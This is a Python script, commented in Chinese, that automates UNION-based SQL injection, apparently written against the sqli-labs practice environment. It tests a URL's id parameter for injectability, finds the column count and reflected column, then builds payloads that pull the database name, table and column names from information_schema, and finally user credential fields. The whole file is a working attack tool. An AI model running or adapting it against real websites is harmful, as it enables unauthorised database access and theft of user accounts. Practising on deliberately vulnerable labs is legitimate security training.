'''
    联合注入

'''

import requests
import sys
import test_bihe
 
'''
    定义
'''
class U(object):
    def __init__(self,URL):
        '''
            url : 攻击方URL 如：http://114.55.107.51/sqli-labs/Less-8/
            cMode ：闭合方式
        '''
        self.url = URL
        self.cmode = self.cmode = test_bihe.bihefangshi(self.url)
        self.list1 = []
        self.flag1 = 0
        self.flag2 = 0
        
    #得到请求头
    def getFlag(self,fUrl):
        res = requests.get(fUrl)
        return res.text
    
    #判断能否使用联合注入
    def isUnionSQLI(self):
        testPayload1 = self.url+"?id=1"
        testPayload2 = self.url+"?id=2"
        if len(self.getFlag(testPayload1)) == len(self.getFlag(testPayload2)):
            return "error"
        return "yes"
        
    #获取测试payload
    def getTestPayload(self):
        furl = ""
        surl = ""
        eurl = ""
        furl = self.url+"?id=1"+self.cmode+"+union+select+1111"
        fLen = len(self.getFlag(furl+"--+"))
        i=1111
        surl = furl
        while 1:
            i=i+1
            surl = surl+","+str(i)            
            if fLen != len(self.getFlag(surl+"--+")):
                eurl = surl+"--+"
                break
        self.flag1=i
        x = eurl.split("=", 1)
        eurl = x[0]+"=-"+x[1]
        return eurl
    
    #得到注入点
    def getInjectionPoint(self,furl):
        point=""
        i = self.flag1
        x = 0
        #print("1"+furl)
        while 1:
            if str(i) in self.getFlag(furl):
                #print("2"+furl)                
                point=point+str(i)+" "
            if i==1111:
                break
            x=x+1
            i=i-1
        return point
    
    #得到当前数据库名
    def getResult(self,point,furl,key):
        x=point.split(" ",1)
        #tLen = len(x)
        test = furl.find(x[0])
        text1=self.getFlag(furl)
        flag1 = text1.find(x[0])
        self.flag1=flag1
        #print(flag1)
        #print(test)
        payload=""
        payload=furl[0:75]+"("+key+")"+furl[79:]
        #print(payload)
        text2=self.getFlag(payload)
        res = text2[flag1:flag1+300]
        x1=res.split("<",1)
        #print(x1[0])
        return x1[0]

    def getCurrentDbName(self,point,furl):
        key="database()"
        tableName=self.getResult(point,furl,key)
        return tableName

    #得到数据库表名
    def getTableName(self,point,furl,key):
        key="select group_concat(table_name separator ';') from information_schema.tables where table_schema='"+key+"'"
        tableName=self.getResult(point,furl,key)
        return tableName

    #获取表中字段名
    def getColumnName(self,point,furl,key):
        key="select group_concat(column_name separator ';') from information_schema.columns where table_schema=database() and table_name='"+key+"'"
        columnName=self.getResult(point,furl,key)
        return columnName

    #获取用户信息
    def getUserInfo(self,point,furl,key1,key2,key3):
        key="select group_concat("+key1+",':',"+key2+" separator ';') from "+key3+""
        userInfo=self.getResult(point,furl,key)
        return userInfo

